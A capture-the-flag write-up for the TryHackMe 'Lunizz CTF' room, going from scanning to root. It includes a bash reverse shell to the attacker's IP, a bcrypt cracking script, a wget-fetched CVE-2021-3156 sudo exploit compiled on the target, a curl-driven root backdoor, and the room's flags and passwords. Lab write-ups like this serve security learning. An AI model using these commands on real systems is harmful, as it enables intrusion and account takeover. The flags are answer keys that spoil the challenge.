# [Lunizz CTF](https://tryhackme.com/room/lunizzctfnd)

> Lunizz CTF

## Scanning

scan the machine

```
nmap -A -T4 10.10.80.142
```

there are 4 open ports (80,3306,4444,5000)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8f7fa2d8-9129-4b16-8519-f47db0f21c66)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ee0f0de9-2ca6-4e20-a4f0-1f1fdbeeb792)

decode the message on port 4444, we have `extremesecurerootpassword` and `p@ssword`

try to connect with netcat

```
nc 10.10.80.142 4444
```

it seem root, but no...

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/755f517f-f044-4711-9f62-0fcf0b30c86c)

## HTTP

just a normal webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/773cff2e-4d82-4278-b255-f09eac30fd56)

## Enumeration

bruteforce the directory

```
gobuster dir -u http://10.10.80.142/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/11fe8e44-0b87-4937-bce9-8149c7f76b33)

check the /hidden directory, it like a upload page

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1640cc87-20a7-4e11-99f5-69ca1162a01c)

and /whatever directory, it like a command injection

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f658b882-f052-49d3-9271-d5683c1841cb)

but all of above is not working

instructions.txt maybe more interested `runcheck:CTF_script_cave_changeme`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/327e91d7-60b2-49d8-b4f9-641434041f7d)

## Exploitation

connect to mysql server

```
mysql -u runcheck -p -h 10.10.80.142
CTF_script_cave_changeme
```

if it appear an error, wait a minute until it connect

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4e2144f9-f03d-4142-aa4a-1976a7c43bab)

```
SHOW DATABASES;
use runornot;
SHOW TABLES;
SELECT * FROM runcheck;
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/54f25b16-a6ca-489d-8369-41f6d408bacd)

hey, what is run level? what is run on root? doesn't this related to what we just found above

```
UPDATE runcheck SET run = 1;
```

comeback /whatever folder, the run level change to 1

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0d6edfc2-e1f7-4eab-b95f-a55e00f06521)

create a reverse shell

```
nc -vlnp 1234
````

```
/bin/bash -c "bash -i >& /dev/tcp/10.18.37.45/1234 0>&1"
```

cool, gain foothold

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c6a5a855-1ee3-41b7-b931-3125f51bda7f)

upgrade shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
export SHELL=/bin/bash;export TERM=xterm-256color
Ctrl+Z
stty raw -echo; fg
```

```
ls -la /
```

i found a folder `proct` is owned by adam maybe interest

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b5faf632-5435-41bc-b479-fa85373b11ca)

we have a subfolder pass and a python file inside

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/90ebe2f0-7ddb-4d1a-97d1-49e66767cf4c)

so crack the password of bcrypt

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```

but it's not work because the password is salted, you must crack by hand

spoil, password is in range middle of rockyou, so it will take you hours of time, create smaller passlist

```
sed -n '7288400,7288830p' /usr/share/wordlists/rockyou.txt > list.txt
```

```
#!/usr/bin/env python3
import bcrypt
import base64

wordlist = []
with open('list.txt','rt') as file:
    f = file.readlines()
    wordlist = [ x.strip() for x in f ]

salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UO'
passwd = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'

for word in wordlist:
    password = word
    bpass = password.encode('utf-8')
    passed= str(base64.b64encode(bpass))
    hashAndSalt = bcrypt.hashpw(passed.encode(), salt)
    print('\r', end='') # Clear previous line
    print(f'Hash: {hashAndSalt}', end='')
    
    if hashAndSalt == passwd:
        print(f'Found: {word}')
        break
```

Spoiler alert: the password is `isolsa_tabefX100pre`. Where does this occur in rockyou?

```
import bcrypt
import base64

salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UO'
passwd = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'

password = 'isolsa_tabefX100pre'
bpass = password.encode('ascii')
passed= str(base64.b64encode(bpass))
hashAndSalt = bcrypt.hashpw(passed.encode(), salt)

if hashAndSalt == passwd:
    print("Match: ", password)
```

Ok. Let's say we use our python script and run through rockyou; how long would that take? 

Honestly I don't know, but it would be a long time. Many hours. i don't know how it got past testing

but, i found another approach at CVE-2021-3156

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f00a1b03-9013-49ca-b99e-86e08dfb0bea)

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
python3 -m http.server
```

on target machine

```
cd /tmp
wget http://10.18.37.45:8000/exploit.c
wget http://10.18.37.45:8000/shellcode.c
wget http://10.18.37.45:8000/Makefile
make
./exploit 0
```

maybe it's not work, a bad experience with a lab...

after login to `adam` with our cracked password, look at Desktop has a archive folder

```
cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8683d644-9f33-4047-9861-c724b8603426)

it's a google map place

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3bed9887-1631-4177-94d1-15af87221087)

so, login to `mason` with password `northernlights` (lowercase and remove spaces)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/34b05b6e-7250-40a4-8b94-4027be6a9c9f)

| Flag | user.txt |
| --- | --- |
| Answer | thm{23cd53cbb37a37a74d4425b703d91883} |

## Privilege Escalation

check `netstat -a` returns a service of root running on `http://127.0.0.1:8080`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bf75f462-6f3a-4647-b90a-d6847dd9da91)

```
curl http://127.0.0.1:8080/
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/60e7a3ea-5c38-46ae-9d02-e16068a73d1f)

it seem a mason's backdoor

```
curl http://127.0.0.1:8080/ -X POST -d "password=northernlights&cmdtype=lsla"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a16b615b-bcdf-499b-adf5-5928227eec3f)

change password

```
curl http://127.0.0.1:8080/ -X POST -d "password=northernlights&cmdtype=passwd"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/80100345-17c1-46b8-995b-4000fa8ee33a)

```
su root
northernlights
cat /root/r00t.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/898df055-7f3f-443b-99e4-c9319e12e70c)

| Flag | r00t.txt |
| --- | --- |
| Answer | thm{ad23b9c63602960371b50c7a697265db} |
